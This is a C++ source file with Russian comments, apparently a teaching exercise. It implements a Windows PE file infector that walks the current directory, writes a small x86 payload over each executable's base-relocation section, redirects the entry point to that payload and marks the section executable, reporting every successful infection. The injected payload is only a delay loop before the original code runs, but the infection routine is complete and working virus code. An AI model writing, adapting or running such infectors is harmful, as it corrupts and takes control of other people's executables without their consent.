#include <Windows.h>
#include <iostream>
#include <filesystem>
#include <string>

using namespace std;
using namespace filesystem;

//макрос преобразования строки к числовой константе
#define stringToType(s, t) (*((const t*)(const void*)s))

// процедура проверки PE + получение заголовков
bool validPE(PBYTE buffer, int n, PIMAGE_NT_HEADERS& ntHeaders)
{
	// проверка того, что заголовки хотя бы поместятся
	if (n < sizeof(IMAGE_DOS_HEADER))
		return false;

	// проверка MZ
	auto dosHeader = (PIMAGE_DOS_HEADER)buffer;
	if (dosHeader->e_magic != stringToType("MZ", WORD))
		return false;

	// получение адреса PE-заголовка + проверка на размер
	DWORD ntHeadersPtr = dosHeader->e_lfanew;
	if (n < ntHeadersPtr + sizeof(IMAGE_NT_HEADERS))
		return false;

	// проверка PE
	ntHeaders = (PIMAGE_NT_HEADERS)(buffer + ntHeadersPtr);
	return ntHeaders->Signature == stringToType("PE\0\0", DWORD);
}

// макрос выравнивания вниз
#define ALIGN_DOWN(x, align)  (x & ~(align - 1))
// макрос выравнивания вверх
#define ALIGN_UP(x, align) ((x & (align-1)) ? ALIGN_DOWN (x, align) + align : x)

// получение смещения в PE по RVA
DWORD RVAtoOffset(PIMAGE_NT_HEADERS ntHeaders, DWORD RVA)
{
	short NumberOfSection = ntHeaders->FileHeader.NumberOfSections;
	long SectionAlign = ntHeaders->OptionalHeader.SectionAlignment;
	PIMAGE_SECTION_HEADER Section = (PIMAGE_SECTION_HEADER)
		(ntHeaders->FileHeader.SizeOfOptionalHeader + (long)&
			(ntHeaders->FileHeader) + sizeof(IMAGE_FILE_HEADER));
	long VirtualAddress, PointerToRawData;
	bool flag = false;
	for (int i = 0; i < NumberOfSection; i++)
	{
		if ((RVA >= (Section->VirtualAddress)) &&
			(RVA < Section->VirtualAddress +
				ALIGN_UP((Section->Misc.VirtualSize), SectionAlign)))
		{
			VirtualAddress = Section->VirtualAddress;
			PointerToRawData = Section->PointerToRawData;
			flag = true;
			break;
		}
		Section++;
	}
	if (flag) return RVA - VirtualAddress + PointerToRawData;
	else return RVA;
}

BYTE code[] = { 0xB9, 0x40, 0x4B, 0x4C, 0x00, 0x51, 0xB9, 0x10, 0x27, 0x00, 0x00, 0xF7, 0xE0, 0xE2, 0xFC, 0x59, 0xE2, 0xF3 };

// собственно функция инфицирования
// будем зацикливать программу
// внедрение через базовые поправки
// возвращает true, если заражение прошло успешно
// false, если файл уже был заражён
bool infect(PBYTE buffer, PIMAGE_NT_HEADERS ntHeaders, int n)
{
	DWORD oldEntryPoint = ntHeaders->OptionalHeader.AddressOfEntryPoint;
	// ссылка на директорию базовых поправок
	auto& dirEntryReloc = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DWORD size = dirEntryReloc.Size;
	DWORD RVA = dirEntryReloc.VirtualAddress;
	DWORD offset = RVAtoOffset(ntHeaders, RVA);

	if (RVA == oldEntryPoint)
		return false;

	buffer += offset;
	memset(buffer, 0, size);
	memcpy(buffer, code, sizeof(code)); // запись кода
	// вызов оригинальной main
	buffer += sizeof(code);
	buffer[0] = 0xBF;
	*((DWORD*)(buffer + 1)) = (oldEntryPoint + ntHeaders->OptionalHeader.ImageBase);
	buffer[5] = 0xFF;
	buffer[6] = 0xD7;

	ntHeaders->OptionalHeader.AddressOfEntryPoint = RVA;
	dirEntryReloc.Size = 0;
	//memset(&dirEntryReloc, 0, sizeof(dirEntryReloc));

	PIMAGE_SECTION_HEADER sections = (PIMAGE_SECTION_HEADER)((BYTE*)(void*)(&ntHeaders->OptionalHeader) + ntHeaders->FileHeader.SizeOfOptionalHeader);
	DWORD secCnt = ntHeaders->FileHeader.NumberOfSections;
	for (int i = 0; i < secCnt; i++)
	{
		DWORD secStart = sections[i].VirtualAddress;
		DWORD secEnd = secStart + sections[i].SizeOfRawData;
		if (secStart <= RVA && RVA <= secEnd)
		{
			sections[i].Characteristics |= (IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE);
		}
	}

	return true;
}

void prepareFile(const char* path)
{
	// открытие файла
	HANDLE hFile = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return;
	DWORD size = GetFileSize(hFile, 0);
	PBYTE buffer = new BYTE[size];
	DWORD read = 0;
	if (!ReadFile(hFile, buffer, size, &read, 0))
	{
		CloseHandle(hFile);
		return;
	}

	// валидация
	PIMAGE_DOS_HEADER dosHeader;
	PIMAGE_NT_HEADERS ntHeaders;
	if (!validPE(buffer, size, ntHeaders))
		return;

	if (infect(buffer, ntHeaders, size))
	{
		if (SetFilePointer(hFile, 0, 0, FILE_BEGIN) != INVALID_SET_FILE_POINTER
			&& WriteFile(hFile, buffer, size, &read, 0))
		{
			cout << "SUCCESS INFECTION OF " << path << endl;
		}
	}
	else
	{
		cout << "FILE " << path << " IS ALREADY INFECTED" << endl;
	}
	CloseHandle(hFile);
}

int main()
{
	// текущая директория
	directory_entry currentDirectory("./");
	for (auto f : directory_iterator(currentDirectory))
		prepareFile(f.path().string().c_str());
	return 0;
}
